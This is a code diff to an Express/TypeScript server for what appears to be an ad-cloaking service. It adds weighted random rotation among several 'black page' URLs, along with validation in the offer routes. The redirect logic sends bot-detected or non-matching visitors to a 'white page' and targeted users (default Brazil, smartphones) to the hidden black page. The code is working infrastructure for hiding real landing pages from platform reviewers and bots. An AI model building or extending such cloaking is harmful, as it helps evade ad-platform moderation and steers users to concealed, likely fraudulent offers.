@@ -921,6 +921,21 @@ async function generateUniqueSlug(
   throw new Error("Failed to generate a unique slug after multiple attempts");
 }
 
+function selectBlackPageUrl(offer: { blackPageUrl: string; blackPages?: Array<{ url: string; percentage: number }> | null }): string {
+  if (!offer.blackPages || !Array.isArray(offer.blackPages) || offer.blackPages.length <= 1) {
+    return offer.blackPages?.[0]?.url || offer.blackPageUrl;
+  }
+  const rand = Math.random() * 100;
+  let cumulative = 0;
+  for (const bp of offer.blackPages) {
+    cumulative += bp.percentage;
+    if (rand < cumulative) {
+      return bp.url;
+    }
+  }
+  return offer.blackPages[offer.blackPages.length - 1].url;
+}
+
 function parseUserAgent(ua: string): "smartphone" | "tablet" | "desktop" {
   const uaLower = ua.toLowerCase();
   if (/android.*mobile|iphone|ipod|blackberry|windows phone/i.test(uaLower)) {
@@ -2016,7 +2031,31 @@ export async function registerRoutes(
   app.post("/api/offers", isAuthenticated, async (req: Request, res: Response) => {
     try {
       const userId = (req.user as any).id;
-      const { name, platform, domainId, blackPageUrl, whitePageUrl, allowedCountries, allowedDevices, isActive } = req.body;
+      const { name, platform, domainId, blackPageUrl, blackPages, whitePageUrl, allowedCountries, allowedDevices, isActive } = req.body;
+
+      let validatedBlackPages: Array<{ url: string; percentage: number }> | null = null;
+      let finalBlackPageUrl = blackPageUrl;
+
+      if (blackPages && Array.isArray(blackPages) && blackPages.length > 0) {
+        if (blackPages.length > 5) {
+          return res.status(400).json({ message: "Maximum of 5 black page links allowed" });
+        }
+        for (const bp of blackPages) {
+          if (!bp.url || typeof bp.url !== 'string' || bp.url.trim() === '') {
+            return res.status(400).json({ message: "All black page links must have a valid URL" });
+          }
+          if (typeof bp.percentage !== 'number' || bp.percentage < 10) {
+            return res.status(400).json({ message: "Each black page link must have at least 10% traffic" });
+          }
+        }
+        const rounded = blackPages.map((bp: any) => ({ url: bp.url.trim(), percentage: Math.round(bp.percentage) }));
+        const totalRounded = rounded.reduce((sum: number, bp: any) => sum + bp.percentage, 0);
+        if (totalRounded !== 100) {
+          rounded[0].percentage += 100 - totalRounded;
+        }
+        validatedBlackPages = rounded;
+        finalBlackPageUrl = validatedBlackPages[0].url;
+      }
 
       const canCreate = await storage.canUserCreateOffer(userId);
       if (!canCreate.allowed) {
@@ -2067,7 +2106,8 @@ export async function registerRoutes(
         platform,
         domainId: parsedDomainId,
         sharedDomainId: parsedSharedDomainId,
-        blackPageUrl,
+        blackPageUrl: finalBlackPageUrl,
+        blackPages: validatedBlackPages,
         whitePageUrl,
         allowedCountries: allowedCountries || ["BR"],
         allowedDevices: allowedDevices || ["smartphone"],
@@ -2092,7 +2132,31 @@ export async function registerRoutes(
         return res.status(404).json({ message: "Offer not found" });
       }
 
-      const { name, slug, platform, domainId, blackPageUrl, whitePageUrl, allowedCountries, allowedDevices, isActive } = req.body;
+      const { name, slug, platform, domainId, blackPageUrl, blackPages, whitePageUrl, allowedCountries, allowedDevices, isActive } = req.body;
+
+      let validatedBlackPages: Array<{ url: string; percentage: number }> | null = null;
+      let finalBlackPageUrl = blackPageUrl;
+
+      if (blackPages && Array.isArray(blackPages) && blackPages.length > 0) {
+        if (blackPages.length > 5) {
+          return res.status(400).json({ message: "Maximum of 5 black page links allowed" });
+        }
+        for (const bp of blackPages) {
+          if (!bp.url || typeof bp.url !== 'string' || bp.url.trim() === '') {
+            return res.status(400).json({ message: "All black page links must have a valid URL" });
+          }
+          if (typeof bp.percentage !== 'number' || bp.percentage < 10) {
+            return res.status(400).json({ message: "Each black page link must have at least 10% traffic" });
+          }
+        }
+        const rounded = blackPages.map((bp: any) => ({ url: bp.url.trim(), percentage: Math.round(bp.percentage) }));
+        const totalRounded = rounded.reduce((sum: number, bp: any) => sum + bp.percentage, 0);
+        if (totalRounded !== 100) {
+          rounded[0].percentage += 100 - totalRounded;
+        }
+        validatedBlackPages = rounded;
+        finalBlackPageUrl = validatedBlackPages[0].url;
+      }
 
       let parsedDomainId: number | null = null;
       let parsedSharedDomainId: number | null = null;
@@ -2127,7 +2191,8 @@ export async function registerRoutes(
         platform,
         domainId: parsedDomainId,
         sharedDomainId: parsedSharedDomainId,
-        blackPageUrl,
+        blackPageUrl: finalBlackPageUrl,
+        blackPages: validatedBlackPages,
         whitePageUrl,
         allowedCountries,
         allowedDevices,
@@ -2175,7 +2240,7 @@ export async function registerRoutes(
         return res.status(404).json({ message: "Offer not found" });
       }
 
-      const targetUrl = variant === 'black' ? offer.blackPageUrl : offer.whitePageUrl;
+      const targetUrl = variant === 'black' ? selectBlackPageUrl(offer) : offer.whitePageUrl;
       if (!targetUrl) {
         return res.status(400).json({ message: `No ${variant} page URL configured` });
       }
@@ -5792,7 +5857,7 @@ export async function registerRoutes(
       // Determine redirect type
       const shouldRedirectToBlack = paramsValid && deviceAllowed && countryAllowed;
       const redirectType = shouldRedirectToBlack ? "black" : "white";
-      const targetUrl = shouldRedirectToBlack ? offer.blackPageUrl : offer.whitePageUrl;
+      const targetUrl = shouldRedirectToBlack ? selectBlackPageUrl(offer) : offer.whitePageUrl;
 
       // Calculate response time before logging
       const duration = Date.now() - startTime;
@@ -6273,7 +6338,7 @@ export async function registerRoutes(
       // Bot detected = always go to WHITE
       const shouldRedirectToBlack = !isBotDetected2 && paramsValid && deviceAllowed && countryAllowed;
       const redirectType = shouldRedirectToBlack ? "black" : "white";
-      const targetUrl = shouldRedirectToBlack ? offer.blackPageUrl : offer.whitePageUrl;
+      const targetUrl = shouldRedirectToBlack ? selectBlackPageUrl(offer) : offer.whitePageUrl;
 
       // Calculate response time before logging
       const duration = Date.now() - startTime;
